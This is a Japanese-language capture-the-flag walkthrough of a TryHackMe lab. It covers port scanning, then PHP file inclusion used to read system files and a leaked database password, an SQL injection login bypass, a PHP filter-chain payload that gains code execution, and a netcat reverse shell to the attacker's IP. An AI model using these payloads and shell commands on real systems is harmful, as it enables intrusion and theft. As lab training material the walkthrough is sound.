# Cheese CTF

https://tryhackme.com/r/room/cheesectfv10

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.171.229
root@ip-10-10-246-228:~# sudo nmap -sV -p1-100 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-31 23:38 GMT
NSOCK ERROR [131.7110s] mksock_bind_addr(): Bind to 0.0.0.0:53 failed (IOD #135): Address already in use (98)
Nmap scan report for 10.10.171.229
Host is up (0.00055s latency).

PORT    STATE SERVICE      VERSION
1/tcp   open  tcpmux?
2/tcp   open  compressnet?
3/tcp   open  compressnet?
4/tcp   open  unknown
5/tcp   open  rje?
6/tcp   open  unknown
7/tcp   open  echo?
8/tcp   open  unknown
9/tcp   open  discard?
10/tcp  open  unknown
11/tcp  open  systat?
12/tcp  open  unknown
13/tcp  open  daytime?
14/tcp  open  unknown
15/tcp  open  netstat?
16/tcp  open  unknown
17/tcp  open  qotd?
18/tcp  open  msp?
19/tcp  open  chargen?
20/tcp  open  ftp-data?
21/tcp  open  ftp?
22/tcp  open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
23/tcp  open  telnet?
24/tcp  open  priv-mail?
25/tcp  open  smtp?
26/tcp  open  rsftp?
27/tcp  open  nsw-fe?
28/tcp  open  unknown
29/tcp  open  msg-icp?
30/tcp  open  unknown
31/tcp  open  msg-auth?
32/tcp  open  unknown
33/tcp  open  dsp?
34/tcp  open  unknown
35/tcp  open  priv-print?
36/tcp  open  unknown
37/tcp  open  time?
38/tcp  open  rap?
39/tcp  open  rlp?
40/tcp  open  unknown
41/tcp  open  graphics?
42/tcp  open  nameserver?
43/tcp  open  whois?
44/tcp  open  mpm-flags?
45/tcp  open  mpm?
46/tcp  open  mpm-snd?
47/tcp  open  ni-ftp?
48/tcp  open  auditd?
49/tcp  open  tacacs?
50/tcp  open  re-mail-ck?
51/tcp  open  la-maint?
52/tcp  open  xns-time?
53/tcp  open  domain?
54/tcp  open  xns-ch?
55/tcp  open  isi-gl?
56/tcp  open  xns-auth?
57/tcp  open  priv-term?
58/tcp  open  xns-mail?
59/tcp  open  priv-file?
60/tcp  open  unknown
61/tcp  open  chat-ctrl    InfoChat Remote Control 06537
62/tcp  open  http         Aethra V3000 VoIP adapter http config
63/tcp  open  http         Thy httpd 4941910 (zlib 90373467)
64/tcp  open  telnet
65/tcp  open  pop3         hMailServer pop3d kBCLrF
66/tcp  open  ssh          (protocol 91)
67/tcp  open  dhcps?
68/tcp  open  dhcpc?
69/tcp  open  pioneers     Pioneers game server
70/tcp  open  gopher?
71/tcp  open  netrjs-1?
72/tcp  open  ftp-proxy    NetApp NetCache ftp proxy
73/tcp  open  netrjs-3?
74/tcp  open  http         IP_SHARER WEB AA (Netgear NRfHq router http config)
75/tcp  open  priv-dial?
76/tcp  open  deos?
77/tcp  open  http         Agranat-EmWeb okp (HP GbE2c Ethernet Blade Switch http config)
78/tcp  open  smtp         qmail smtpd (qmail-smtpd-auth 0.31)
79/tcp  open  nagios-nsca  Nagios NSCA
80/tcp  open  http         Apache httpd 2.4.41 ((Ubuntu))
81/tcp  open  ms-sql-s     Microsoft SQL Server
82/tcp  open  imap         GNU mailutils imapd eFegoqn
83/tcp  open  http         Pow Rack server
84/tcp  open  ssh          (protocol 36878933)
85/tcp  open  ftp          DigiDNA FileApp ftpd
86/tcp  open  mfcobol?
87/tcp  open  priv-term-l?
88/tcp  open  ftp
89/tcp  open  http         TJWS httpd n (Based on Acme.Serve Vs)
90/tcp  open  http         GoAhead WebServer (Router with realtek 8181 chipset http config)
91/tcp  open  ftp          Actiontec router ftpd (firewall broken; BusyBox B_)
92/tcp  open  http         Microsoft IIS httpd 3.X
93/tcp  open  imap         DeskNow imapd zyYS
94/tcp  open  objcall?
95/tcp  open  supdup?
96/tcp  open  imap         hMailServer imapd
97/tcp  open  telnet       Huawei telnetd
98/tcp  open  ftp          FileZilla ftpd
99/tcp  open  http         AmaroK media player http interface (SimpleHTTP 0942; Python 9)
100/tcp open  ssh          Force10 switch sshd (protocol 897656217)
```

全ポートOpenしていて困る。

### gobuster

```shell
root@ip-10-10-246-228:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.171.229
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.10.171.229/images/]
/server-status        (Status: 403) [Size: 278]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-246-228:~# gobuster dir -x php,txt,html -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.171.229
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/login.php            (Status: 200) [Size: 834]
/users.html           (Status: 200) [Size: 377]
/images               (Status: 301) [Size: 315] [--> http://10.10.171.229/images/]
/index.html           (Status: 200) [Size: 1759]
/messages.html        (Status: 200) [Size: 448]
/orders.html          (Status: 200) [Size: 380]
/server-status        (Status: 403) [Size: 278]
Progress: 873100 / 873104 (100.00%)
===============================================================
Finished
===============================================================
```

```shell$ dirsearch -u http://10.10.171.229/                 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/CTF/reports/http_10.10.171.229/__25-01-31_19-09-33.txt

Target: http://10.10.171.229/

[19:09:33] Starting: 
[19:09:49] 403 -  278B  - /.ht_wsr.txt                                      
[19:09:49] 403 -  278B  - /.htaccess.bak1                                   
[19:09:49] 403 -  278B  - /.htaccess.save                                   
[19:09:49] 403 -  278B  - /.htaccess.orig
[19:09:49] 403 -  278B  - /.htaccess_extra
[19:09:49] 403 -  278B  - /.htaccess_orig                                   
[19:09:49] 403 -  278B  - /.htaccessBAK                                     
[19:09:49] 403 -  278B  - /.htaccessOLD2
[19:09:49] 403 -  278B  - /.htaccess_sc
[19:09:49] 403 -  278B  - /.htaccessOLD                                     
[19:09:49] 403 -  278B  - /.htaccess.sample                                 
[19:09:49] 403 -  278B  - /.htm                                             
[19:09:49] 403 -  278B  - /.html
[19:09:49] 403 -  278B  - /.htpasswd_test                                   
[19:09:49] 403 -  278B  - /.htpasswds                                       
[19:09:49] 403 -  278B  - /.httr-oauth                                      
[19:09:55] 403 -  278B  - /.php                                             
[19:12:15] 301 -  315B  - /images  ->  http://10.10.171.229/images/         
[19:12:15] 200 -  485B  - /images/                                          
[19:12:35] 200 -  370B  - /login.php                                        
[19:12:57] 200 -  254B  - /orders.html                                      
[19:13:45] 403 -  278B  - /server-status                                    
[19:13:46] 403 -  278B  - /server-status/                                   
[19:14:32] 200 -  254B  - /users.html                                       
                                                                             
Task Completed
```

## secret-script.php

/messages.html に下記のリンクがある。

http://10.10.171.229/secret-script.php?file=php://filter/resource=supersecretmessageforadmin

### /etc/passwd
http://10.10.171.229/secret-script.php?file=php://filter/resource=/etc/passwd

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
comte:x:1000:1000:comte:/home/comte:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
```

ログイン可能なのは、root と comte のみ。

### バージョン

http://10.10.171.229/secret-script.php?file=php://filter/resource=/proc/version
http://10.10.171.229/secret-script.php?file=php://filter/resource=/etc/issue


```text
Linux version 5.4.0-174-generic (buildd@bos03-amd64-026) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #193-Ubuntu SMP Thu Mar 7 14:29:28 UTC 2024 

Ubuntu 20.04.6 LTS \n \l 
```

### login.php

http://10.10.171.229/secret-script.php?file=php://filter/read=convert.base64-encode/resource=/var/www/html/login.php

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="login.css">
</head>
<body>
    <div class="login-container">
        <h1>Login</h1>
        
        <form method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Login</button>
        </form>
        
    </div>
    <?php
// Replace these with your database credentials
$servername = "localhost";
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";

// Create a connection to the database
$conn = new mysqli($servername, $user, $password, $dbname);

// Check the connection
if ($conn->connect_error) {
    echo $conn->connect_error;
    die("Connection failed: " . $conn->connect_error);

}

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $pass = $_POST["password"];
    function filterOrVariations($input) {
     //Use case-insensitive regular expression to filter 'OR', 'or', 'Or', and 'oR'
    $filtered = preg_replace('/\b[oO][rR]\b/', '', $input);
    
    return $filtered;
}
    $filteredInput = filterOrVariations($username);
    //echo($filteredInput);
    // Hash the password (you should use a stronger hashing algorithm)
    $hashed_password = md5($pass);
    
    
    // Query the database to check if the user exists
    $sql = "SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'";
    $result = $conn->query($sql);
    $status = "";
    if ($result->num_rows == 1) {
        // Authentication successful
        $status = "Login successful!";
         header("Location: secret-script.php?file=supersecretadminpanel.html");
         exit;
    } else {
        // Authentication failed
         $status = "Login failed. Please check your username and password.";
    }
}
// Close the database connection
$conn->close();
?>
<div id = "status"><?php echo $status; ?></div>
</body>
</html>
```

usernameの or をフィルターしていることが分かった。  
|| を使ってフィルターを回避する

```http
POST /login.php HTTP/1.1
Host: 10.10.171.229
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://10.10.171.229
Connection: keep-alive
Referer: http://10.10.171.229/login.php
Upgrade-Insecure-Requests: 1

username=' || '1' = '1' -- &password=bbb


HTTP/1.1 302 Found
Date: Sat, 01 Feb 2025 00:57:27 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: secret-script.php?file=supersecretadminpanel.html
Content-Length: 792
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

ログインできてダッシュボードのような画面が表示されたが何もない。  
そもそもセッションIDが付与されるわけでもない。

### secret-script.php

http://10.10.171.229/secret-script.php?file=php://filter/read=convert.base64-encode/resource=/var/www/html/secret-script.php

```php
<?php
  //echo "Hello World";
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>
```

外部URLやdataスキームの挿入は機能しなかったので無効になっている？

```text
http://10.10.171.229/secret-script.php?file=http://10.2.22.182:8000/shell.php

http://10.10.171.229/secret-script.php?file=php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

http://10.10.4.175/secret-script.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
```

フィルターチェーンツールでチェーンを生成し、file=に渡したら、phpinfo が表示された。

https://github.com/synacktiv/php_filter_chain_generator

```shell
$ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
[+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

disable_functions
```text
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,
```

system関数自体は無効にされていなかった。

```shell
$ python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
[+] The following gadget chain will generate the following code : <?=`$_GET[0]`?> (base64 value: PD89YCRfR0VUWzBdYD8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

0パラメータを追加して下記のようにシェルを実行する。

http://10.10.4.175/secret-script.php?0=ls&file=php://filter/convert.iconv.UTF8.......

リバースシェル

```shell
rm /tmp/f; mkfifo /tmp/f; nc 10.2.22.182 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
をURLエンコードして0パラメータにする。
```
rm+%2Ftmp%2Ff%3B+mkfifo+%2Ftmp%2Ff%3B+nc+10.2.22.182+1234+%3C+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+%3E%2Ftmp%2Ff+2%3E%261%3B+rm+%2Ftmp%2Ff
```

実際のリクエスト  
http://10.10.4.175/secret-script.php?0=rm+%2Ftmp%2Ff%3B+mkfifo+%2Ftmp%2Ff%3B+nc+10.2.22.182+1234+%3C+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+%3E%2Ftmp%2Ff+2%3E%261%3B+rm+%2Ftmp%2Ff&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```shell
$ nc -nvlp 1234                      
listening on [any] 1234 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.4.175] 54002
whoami
www-data
```

シェルを取得できた。

```shell
ls -al /home/comte
total 52
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 .
drwxr-xr-x 3 root  root  4096 Sep 27  2023 ..
-rw------- 1 comte comte   55 Apr  4  2024 .Xauthority
lrwxrwxrwx 1 comte comte    9 Apr  4  2024 .bash_history -> /dev/null
-rw-r--r-- 1 comte comte  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 comte comte 3771 Feb 25  2020 .bashrc
drwx------ 2 comte comte 4096 Sep 27  2023 .cache
drwx------ 3 comte comte 4096 Mar 25  2024 .gnupg
drwxrwxr-x 3 comte comte 4096 Mar 25  2024 .local
-rw-r--r-- 1 comte comte  807 Feb 25  2020 .profile
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .ssh
-rw-r--r-- 1 comte comte    0 Sep 27  2023 .sudo_as_admin_successful
drwx------ 3 comte comte 4096 Mar 25  2024 snap
-rw------- 1 comte comte 4276 Sep 15  2023 user.txt
```

comteの所有ファイル

```shell
find / -user comte -type f 2>/dev/null
/home/comte/.profile
/home/comte/.bashrc
/home/comte/.sudo_as_admin_successful
/home/comte/.Xauthority
/home/comte/.bash_logout
/home/comte/user.txt
/home/comte/.ssh/authorized_keys
```

SUID

```shell
find / -perm -u=s -type f -ls 2>/dev/null
      296    133 -rwsr-xr-x   1 root     root       135928 Feb 18  2024 /snap/snapd/21184/usr/lib/snapd/snap-confine
      297    129 -rwsr-xr-x   1 root     root       131832 Aug 25  2023 /snap/snapd/20092/usr/lib/snapd/snap-confine
      847     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/2182/usr/bin/chfn
